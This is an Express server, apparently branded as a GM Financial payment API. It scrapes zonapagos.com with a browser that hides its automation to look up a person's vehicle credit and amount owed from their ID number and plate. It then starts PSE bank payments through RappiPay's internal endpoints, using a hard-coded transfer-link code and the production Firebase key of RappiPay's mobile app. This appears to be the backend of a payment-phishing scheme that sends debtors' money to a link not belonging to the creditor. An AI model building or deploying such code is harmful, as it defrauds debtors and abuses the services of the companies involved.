import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import puppeteer from 'puppeteer';
import https from 'https';
import crypto from 'crypto';

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy-Report-Only', "default-src * 'unsafe-inline' 'unsafe-eval'");
  next();
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ═══════════════════════════════════════════════════════════════
// ============= POOL DE NAVEGADORES (GM) ========================
// ═══════════════════════════════════════════════════════════════
let browserPool = [];
const MAX_PAGES = 5;
const POOL_SIZE = 3;
let activeConsultations = 0;
const consultationQueue = [];

async function initializeBrowserPool() {
  console.log('[POOL] Inicializando pool de navegadores...');
  for (let i = 0; i < Math.min(POOL_SIZE, 1); i++) {
    const b = await puppeteer.launch({
      headless: 'new',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-blink-features=AutomationControlled'
      ]
    });
    browserPool.push(b);
  }
  console.log(`[POOL] Pool iniciado con ${browserPool.length} navegador(es)`);
}

async function getBrowserFromPool() {
  if (browserPool.length > 0) {
    return browserPool.pop();
  }

  if (activeConsultations < MAX_PAGES) {
    return await puppeteer.launch({
      headless: 'new',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-blink-features=AutomationControlled'
      ]
    });
  }

  return new Promise((resolve) => {
    consultationQueue.push(resolve);
  });
}

function returnBrowserToPool(b) {
  if (browserPool.length < POOL_SIZE) {
    browserPool.push(b);
  }

  if (consultationQueue.length > 0) {
    const resolve = consultationQueue.shift();
    resolve(b);
  }
}

async function consultarZonaPagos(documento, placa) {
  activeConsultations++;
  let browserInstance = null;

  try {
    console.log(`[API] Consultando (${activeConsultations} activas) - Documento: ${documento}, Placa: ${placa}`);

    browserInstance = await getBrowserFromPool();
    const page = await browserInstance.newPage();

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    await page.setViewport({ width: 1280, height: 800 });

    console.log('[API] PASO 1: Navegando a PreLoginPage...');
    await page.goto('https://zonapagos.com/NV_PagosN3/Views/preLogin/PreLoginPage.aspx?ico=33968', {
      waitUntil: 'networkidle2',
      timeout: 30000
    });

    // Reemplazo de page.waitForTimeout por setTimeout nativo
    await new Promise(r => setTimeout(r, 2000));

    console.log('[API] PASO 2: Esperando formulario...');
    await page.waitForSelector('input', { timeout: 15000 });
    await new Promise(r => setTimeout(r, 1000));

    console.log('[API] PASO 3: Llenando documento...');
    const inputs = await page.$$('input[type="text"]');
    if (inputs.length >= 1) {
      await inputs[0].click();
      await inputs[0].type(documento, { delay: 30 });
    }

    console.log('[API] PASO 4: Llenando placa...');
    if (inputs.length >= 2) {
      await inputs[1].click();
      await inputs[1].type(placa, { delay: 30 });
    }

    console.log('[API] PASO 5: Haciendo click en Continuar...');
    const btn = await page.$('button[type="submit"], input[type="submit"]');
    if (btn) {
      await Promise.race([
        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {}),
        btn.click()
      ]);
    }

    await new Promise(r => setTimeout(r, 2000));

    console.log('[API] PASO 6: Extrayendo datos con tabla...');
    const datosExtraidos = await page.evaluate(() => {
      const datos = [];
      const tablas = document.querySelectorAll('table');

      for (let tabla of tablas) {
        const rows = tabla.querySelectorAll('tr');
        for (let row of rows) {
          const cells = row.querySelectorAll('td');
          if (cells.length > 5) {
            const rowData = {
              numeroCredito: cells[1]?.textContent?.trim() || '',
              placa: cells[10]?.textContent?.trim() || '',
              fechaVencimiento: cells[14]?.textContent?.trim() || '',
              valorSugerido: cells[15]?.textContent?.trim() || ''
            };
            if (rowData.numeroCredito || rowData.placa) {
              datos.push(rowData);
            }
          }
        }
      }

      return datos;
    });

    console.log('[API] Datos extraídos:', datosExtraidos);
    await page.close();

    if (datosExtraidos.length > 0) {
      console.log('[API] ✅ Consulta exitosa');
      return {
        estado: 'exitoso',
        documento: documento,
        placa: placa,
        facturas: datosExtraidos,
        timestamp: new Date().toISOString()
      };
    } else {
      console.log('[API] ⚠️ No se encontraron facturas');
      return {
        error: 'No se encontraron facturas',
        estado: 'no_encontrado',
        documento: documento,
        placa: placa
      };
    }

  } catch (error) {
    console.error('[API ERROR]', error.message);
    throw error;
  } finally {
    activeConsultations--;
    if (browserInstance) {
      returnBrowserToPool(browserInstance);
    }
  }
}

// ═══════════════════════════════════════════════════════════════
// ═══════════ NUEVO: RAPPIPAY PSE (integración de pago) ═════════
// ═══════════════════════════════════════════════════════════════

const RAPPIPAY_API = 'https://services.prod-k8s.rappipay.com/integration/pse/api';
const RAPPIPAY_LINK_CODE = 'KAnsiZ';
const FIREBASE_API_KEY = 'AIzaSyBXJ_5dpN6uTDr41m72dcS_ZKJtGc_dVHw';
const FIREBASE_DB_URL = 'https://rpp-platform-mobile-app-prod-default-rtdb.firebaseio.com';

// ─── HTTPS GET helper ──────────────────────────────────────
function httpsGet(urlStr, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const opts = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'GET',
      headers: { 'Accept': 'application/json', ...extraHeaders },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch { resolve(body); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

// ─── HTTPS POST helper ────────────────────────────────────
function httpsPost(urlStr, data, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const payload = JSON.stringify(data);
    const opts = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        ...extraHeaders,
      },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch { resolve(body); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

// ─── RUTA: Obtener Bancos PSE ───
app.get('/pse/bancos', async (req, res) => {
  try {
    const linkData = await httpsGet(
      `${RAPPIPAY_API}/transfer-link/code/${RAPPIPAY_LINK_CODE}`,
      { 'traceability-id': crypto.randomUUID() }
    );
    const bancos = linkData.banks || [];
    console.log(`[pse] ${bancos.length} bancos obtenidos`);
    return res.json({ ok: true, bancos });
  } catch (err) {
    console.error('[pse] Error bancos:', err.message);
    return res.status(500).json({ ok: false, error: 'Error obteniendo bancos: ' + err.message });
  }
});

// ─── RUTA: Crear Pago PSE ───
app.post('/pse/pagar', async (req, res) => {
  const { bank_code, bank_name, document_type, document_number, amount } = req.body;

  if (!bank_code || !document_number || !amount) {
    return res.status(400).json({ ok: false, error: 'Faltan campos requeridos (bank_code, document_number, amount)' });
  }

  try {
    console.log(`[pse] Pago: banco=${bank_code}, doc=${document_number}, monto=${amount}`);

    // 1) Obtener link
    const linkData = await httpsGet(
      `${RAPPIPAY_API}/transfer-link/code/${RAPPIPAY_LINK_CODE}`,
      { 'traceability-id': crypto.randomUUID() }
    );
    const transfer = linkData.transfer || linkData;
    if (transfer.status !== 'CREATED') {
      return res.status(400).json({ ok: false, error: 'Link no disponible (status: ' + transfer.status + ')' });
    }

    const traceability_id = transfer.traceability_id;
    const minAmount = transfer.min_amount || 10000;
    const maxAmount = transfer.max_amount || 20000000;
    if (amount < minAmount || amount > maxAmount) {
      return res.status(400).json({
        ok: false,
        error: `Monto debe estar entre $${minAmount.toLocaleString()} y $${maxAmount.toLocaleString()}`
      });
    }

    const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.socket.remoteAddress || '127.0.0.1';

    // 2) Crear payment URL
    const paymentPayload = {
      traceability_id,
      bank_code,
      bank_name: bank_name || '',
      document_type: document_type || 'CC',
      document_number: String(document_number),
      amount: Number(amount),
      user_agreement_check: true,
      client_ip: clientIp,
    };
    const headerTraceId = crypto.randomUUID();
    console.log('[pse] POST /payment-url payload:', JSON.stringify(paymentPayload));

    const paymentResp = await httpsPost(
      `${RAPPIPAY_API}/payment-url`,
      paymentPayload,
      { 'traceability-id': headerTraceId }
    );
    console.log('[pse] payment-url response:', JSON.stringify(paymentResp).substring(0, 500));

    const firebaseToken = paymentResp.token || paymentResp.custom_token || paymentResp.firebase_token;
    const directUrl = paymentResp.bank_url || paymentResp.url
      || paymentResp.redirect_url || paymentResp.payment_url;

    if (directUrl) {
      console.log('[pse] URL directa del banco recibida ✓');
      return res.json({ ok: true, bank_url: directUrl, traceability_id });
    }

    if (!firebaseToken) {
      return res.status(500).json({ ok: false, error: 'No se recibió token de pago', debug: paymentResp });
    }

    const txTraceId = paymentResp.traceability_id || traceability_id;

    // 3) Firebase auth
    const firebaseAuth = await httpsPost(
      `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${FIREBASE_API_KEY}`,
      { token: firebaseToken, returnSecureToken: true }
    );

    if (!firebaseAuth.idToken) {
      return res.status(500).json({ ok: false, error: 'Error autenticación Firebase' });
    }

    console.log('[pse] Firebase auth OK');

    // 4) Polling Firebase por URL del banco
    const firebasePath = `cash_flow_cash_in_pse_link_transaction/${txTraceId}.json?auth=${firebaseAuth.idToken}`;
    let bankUrl = null;

    for (let i = 0; i < 15; i++) {
      await new Promise(r => setTimeout(r, i === 0 ? 3000 : 2000));
      try {
        const fbData = await httpsGet(`${FIREBASE_DB_URL}/${firebasePath}`);
        console.log(`[pse] Firebase poll ${i + 1}/15:`, JSON.stringify(fbData)?.substring(0, 400));
        const link = fbData?.data?.params?.link || fbData?.params?.link || fbData?.link;
        if (link) { bankUrl = link; break; }
      } catch (fbErr) {
        console.error(`[pse] Firebase poll ${i + 1} error:`, fbErr.message);
      }
    }

    if (!bankUrl) {
      return res.status(500).json({ ok: false, error: 'No se pudo obtener la URL del banco.' });
    }

    return res.json({ ok: true, bank_url: bankUrl, traceability_id });

  } catch (err) {
    console.error('[pse] Error:', err.message);
    return res.status(500).json({ ok: false, error: 'Error procesando pago: ' + err.message });
  }
});

// ═══════════════════════════════════════════════════════════════
// ============= RUTAS GM ORIGINALES =============================
// ═══════════════════════════════════════════════════════════════

app.post('/api/consultar', async (req, res) => {
  try {
    const { documento, placa } = req.body;

    if (!documento || !placa) {
      return res.status(400).json({
        error: 'Documento y placa son requeridos',
        estado: 'error'
      });
    }

    const resultado = await consultarZonaPagos(documento, placa);

    if (resultado.estado === 'exitoso') {
      res.json(resultado);
    } else {
      res.status(404).json(resultado);
    }

  } catch (error) {
    console.error('[API ERROR]', error.message);
    res.status(500).json({
      error: 'Error al consultar: ' + error.message,
      estado: 'error'
    });
  }
});

app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    activeConsultations: activeConsultations,
    browserPoolSize: browserPool.length,
    queuedRequests: consultationQueue.length
  });
});

app.use(express.static('.'));

app.get('/', (req, res) => {
  res.send('<h1>API GM Financial</h1>');
});

async function start() {
  try {
    await initializeBrowserPool();

    app.listen(PORT, () => {
      console.log(`✅ Servidor en puerto ${PORT}`);
      console.log(`🔗 POST http://localhost:${PORT}/api/consultar`);
      console.log(`🔗 GET  http://localhost:${PORT}/pse/bancos`);
      console.log(`🔗 POST http://localhost:${PORT}/pse/pagar`);
      console.log(`📍 Pool: ${POOL_SIZE} navegadores, máx ${MAX_PAGES} consultas`);
    });
  } catch (error) {
    console.error('Error al iniciar:', error);
    process.exit(1);
  }
}

start();
